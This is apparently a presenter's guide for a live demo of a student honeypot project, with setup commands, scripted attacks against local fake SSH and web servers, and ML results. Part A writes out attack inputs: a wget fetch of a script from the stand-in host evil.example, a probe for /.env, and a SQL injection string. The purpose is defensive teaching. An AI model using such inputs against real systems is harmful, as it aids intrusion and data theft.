# Live demo guide (about 6 minutes)

Two parts: **A. the honeypot catching attacks live** (4 minutes) and **B. the machine-learning results** (2 minutes). Lines marked **Say** are suggestions in French; adapt them.

> **What was tested.** Every command in Part A was executed on 2026-11-21 *without Docker* (same programs, same ports), and Part B with `scripts/run_analysis.py`. The Docker Compose start-up itself could not be run in that environment (no Docker daemon); the Compose file was validated with `docker compose config`. **Rehearse Part A once on the presentation laptop.**

## Before the presentation (the day before)

| Check | Command (PowerShell, in the `HoneyBadger` folder) | Expected |
|---|---|---|
| Docker Desktop running | `docker version` | Client **and** Server sections |
| Environment file | `copy .env.example .env` | File created |
| Images built | `docker compose build` | Finishes without error (several minutes the first time) |
| Ports free | close anything on 3000, 3001, 8000, 8022, 8081, 8090, 9090, 9093 | |
| Notebook ready | open `notebooks/pair1_attack_classification.ipynb` in Colab with both CSVs uploaded, Run all once | Runs without error |
| Fallback ready | `cd dashboard; npm install` | Needed only for the mock-mode fallback |

## Part A: the honeypot live (4 minutes)

### A1. Start the stack (30 s; start it before you begin speaking)

```powershell
docker compose up -d
docker compose ps
```

Expected: `postgres`, `backend`, `dashboard`, `prometheus`, `alertmanager`, `grafana` running; `backend` becomes `healthy` after its migrations.

```powershell
curl.exe http://localhost:8090/health
```

Expected: `{"status": "ok", "db": "ok", "version": "0.2.0", "uptime_s": ...}`

**Say:** « HoneyBadger tourne en local : un faux serveur SSH sur le port 8022, un faux site web sur le port 8081, une base PostgreSQL, et un tableau de bord. Tout est lancé avec une seule commande, docker compose. »

### A2. Show the empty dashboard (20 s)

Open http://localhost:3000. It may say "Quiet window" if no attack has arrived yet.

**Say:** « Pour l'instant, aucune attaque. On va jouer le rôle de l'attaquant. »

### A3. Attack it by hand (60 s)

```powershell
ssh -p 8022 root@localhost
```

Type any password (for example `123456`). You get a shell prompt. Type:

```text
whoami
uname -a
wget http://evil.example/bot.sh
exit
```

If SSH warns that the host key changed, run it once with `-o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL`.

Then one web scan and one injection attempt:

```powershell
curl.exe http://localhost:8081/.env
curl.exe "http://localhost:8081/?id=1'%20OR%201=1--"
```

**Say:** « Le faux serveur accepte n'importe quel mot de passe. Les commandes répondent de façon crédible, mais rien n'est exécuté : le `wget` n'a rien téléchargé, on a seulement noté l'adresse. Le mot de passe n'est jamais stocké en clair, seulement son empreinte SHA-256. »

### A4. Show what was captured (45 s)

Back on the dashboard (it refreshes by itself; press F5 if needed). Point at:

- **Live intercepts:** your `whoami` (T1059), `wget` (T1105), `/.env` (T1595), the injection (T1190).
- **ATT&CK coverage:** the techniques and their counts.

**Say:** « Chaque action est enrichie automatiquement : la localisation de l'adresse IP, et une technique MITRE ATT&CK. Ici T1105, c'est le téléchargement d'un outil ; T1190, l'exploitation d'une application web. »

Local traffic (127.0.0.1) has no location, so the map stays empty. That is expected.

### A5. Generate a realistic wave (60 s)

```powershell
docker compose exec backend python -m sim.simulate --count 12 --delay 0.2 --spoof-sources
```

`--spoof-sources` makes the web probes appear to come from 10 public addresses on six continents (via the `X-Forwarded-For` header), so the world map has points. Without it, every simulated attack comes from 127.0.0.1, which has no location. **Say it is demo data** if you show the map.

Expected output (counts vary slightly with what is already in the window):

```text
Sent 12 of 12 SSH attacks (24 commands) and 6 of 6 HTTP probes.
Events recorded since the run started, by MITRE technique:
  T1059      18
  ...
```

The activity chart shows a peak. **Say:** « Le simulateur envoie des attaques réalistes mais inoffensives : connexions SSH, commandes, téléchargements, scans web, injections SQL. On voit la vague arriver en temps réel. »

### A6. Optional: monitoring (20 s)

Grafana at http://localhost:3001 (dashboards "Overview", "Attack Patterns"). **Say:** « Les métriques partent aussi vers Prometheus et Grafana, avec des alertes sur les vagues de force brute. »

## Part B: the machine-learning results (2 minutes)

Open `notebooks/pair1_attack_classification.ipynb` (Colab or Jupyter). All outputs are saved inside, so nothing has to run live. Scroll to:

1. **§2.3 Class balance chart.** **Say:** « 25 192 connexions étiquetées, presque équilibrées : 53 % normales, 47 % attaques. »
2. **§4.2 Results table and confusion matrices.** **Say:** « Sur 5 039 connexions jamais vues pendant l'entraînement, la forêt aléatoire attrape 2 339 attaques sur 2 349, sans aucune fausse alerte. La référence naïve n'en attrape aucune. »
3. **§4.6 HoneyBadger features.** **Say:** « Avec seulement les informations que notre honeypot sait calculer aujourd'hui, le F1 passe de 0,998 à 0,984 : il faudrait enregistrer les octets échangés. »

If time allows, open `pair2_anomaly_detection.ipynb`, §4.2: **Say:** « Sans étiquettes, en n'apprenant que le trafic normal, on attrape encore environ 84 % des attaques pour 1 % de fausses alertes. »

To show the results are reproducible (optional, terminal):

```powershell
python scripts/run_analysis.py --check-only
```

Expected: `pair1: 26/26 checks passed`, `pair2: 24/24 checks passed`, `All checks passed.`

## Clean up

```powershell
docker compose down        # keeps the database
docker compose down -v     # also deletes the database
```

## Common problems and fixes

| Problem | Fix |
|---|---|
| `docker compose up` says a port is in use | Close the program using it, or change the left-hand port in `docker-compose.yml` |
| `backend` restarts or stays unhealthy | `docker compose logs backend`; usually PostgreSQL was not ready. Wait 20 s and `docker compose restart backend` |
| Dashboard shows nothing | Check `curl.exe http://localhost:8090/health`; then press F5 |
| `ssh` asks for a key or refuses | Use `ssh -o PreferredAuthentications=password -p 8022 root@localhost` |
| Simulator prints "Could not read .../events" | The API is not up yet; wait and rerun with `--no-check` |
| Everything fails on the day | Fallback: run the dashboard with demo data, no backend: `cd dashboard`, `$env:VITE_API_MODE="mock"; npm run dev`, open http://localhost:5173. Say that it shows bundled sample data. Then go straight to Part B. |
| Notebook won't load the CSVs | In Colab: drag `Train_data.csv` and `Test_data.csv` into the Files panel and run again. Locally: put them in `data/` |

## Running without Docker (tested path)

Useful on Linux or WSL if Docker is unavailable. Needs PostgreSQL 14+, Python 3.11+ and Node 18+.

```bash
# 1. Database: create role "honeybadger" (password "honeybadger") and database "honeybadger" on port 15432
# 2. Backend
cd backend
pip install -r requirements.txt
export HB_DATABASE_URL=postgresql+asyncpg://honeybadger:honeybadger@127.0.0.1:15432/honeybadger
alembic upgrade head
python main.py                 # SSH :8022, HTTP :8081, API :8090, metrics :8000
# 3. Dashboard (another terminal)
cd dashboard && npm install && npm run dev      # http://localhost:5173
# 4. Attacks (another terminal)
cd backend && python -m sim.simulate --count 12 --delay 0.2
```
